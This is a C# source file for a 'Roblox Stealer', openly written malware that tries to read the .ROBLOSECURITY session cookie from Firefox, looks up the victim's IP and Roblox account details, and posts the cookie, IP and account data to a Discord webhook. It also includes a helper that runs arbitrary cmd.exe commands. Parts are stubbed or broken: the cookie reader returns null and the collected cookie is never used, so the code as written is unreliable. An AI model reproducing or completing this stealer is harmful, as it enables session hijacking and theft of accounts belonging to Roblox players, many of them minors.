using System;
using System.Collections.Generic;
using System.Net.Http;

class Program
{
    static void Main(string[] args)
    {
        string webhookk = "YOUR_WEBHOOK";
        string roblox_cookie = "";

        void command(string c)
        {
            System.Diagnostics.Process.Start("cmd.exe", "/C " + c);
        }

        List<string> CookieLogger()
        {
            List<string> data = new List<string>(); 

            try
            {
                foreach (var cookie in GetBrowserCookies("firefox", "roblox.com"))
                {
                    if (cookie.Name == ".ROBLOSECURITY")
                    {
                        data.Add(cookie.ToString());
                        data.Add(cookie.Value);
                        return data;
                    }
                }
            }
            catch { }


            return data;
        }

        IEnumerable<System.Net.Cookie> GetBrowserCookies(string browser, string domain)
        {

            return null;
        }

        List<string> cookies = CookieLogger();

        HttpClient client = new HttpClient();
        string ip_address = client.GetStringAsync("https://api.ipify.org/").Result;

        string isvalid = ""; 
        if (isvalid == "Valid Cookie")
        {
            //
        }
        else
        {
            var content = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("content", $"cookie is expired\n```{roblox_cookie}```")
            });
            var response = client.PostAsync(webhookk, content).Result;
            Environment.Exit(0);
        }

        HttpResponseMessage ebruh = client.GetAsync("https://www.roblox.com/mobileapi/userinfo?=.ROBLOSECURITY=" + roblox_cookie).Result;
        string ebruhText = ebruh.Content.ReadAsStringAsync().Result;
        dynamic info = Newtonsoft.Json.JsonConvert.DeserializeObject(ebruhText);
        string rid = info.UserID;
        string rap = ""; 
        int friends = 0; 
        string age = ""; 
        string crdate = "";
        string rolimons = $"https://www.rolimons.com/player/{rid}";
        string roblox_profile = $"https://web.roblox.com/users/{rid}/profile";
        string headshot = "";
        string username = info.UserName;
        string robux = info.RobuxBalance;
        bool premium = info.IsPremium;


        // Sending to Webhook
        var payload = new
        {
            username = "Roblox Stealer",
            avatar_url = "https://cdn.discordapp.com/avatars/967525682085244988/372982ccc3d235c38ac5eea51c7fece9.png",
            embeds = new[]
            {
                new
                {
                    username = "Roblox Stealer",
                    title = "+1 Result Account",
                    description = $"[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
                    color = 12452044,
                    fields = new[]
                    {
                        new { name = "Username", value = username, inline = true },
                        new { name = "Robux", value = robux, inline = true },
                        new { name = "Premium Status", value = premium, inline = true },
                        new { name = "Creation Date", value = crdate, inline = true },
                        new { name = "RAP", value = rap, inline = true },
                        new { name = "Friends", value = friends, inline = true },
                        new { name = "Account Age", value = age, inline = true },
                        new { name = "IP", value = ip_address, inline = true },
                        new { name = ".ROBLOSECURITY", value = $"```fix\n{roblox_cookie}```", inline = false }
                    },
                    thumbnail = new { url = headshot }
                }
            }
        };

        string payloadJson = Newtonsoft.Json.JsonConvert.SerializeObject(payload);

        client.PostAsync(webhookk, new StringContent(payloadJson, System.Text.Encoding.UTF8, "application/json")).Wait();
    }
}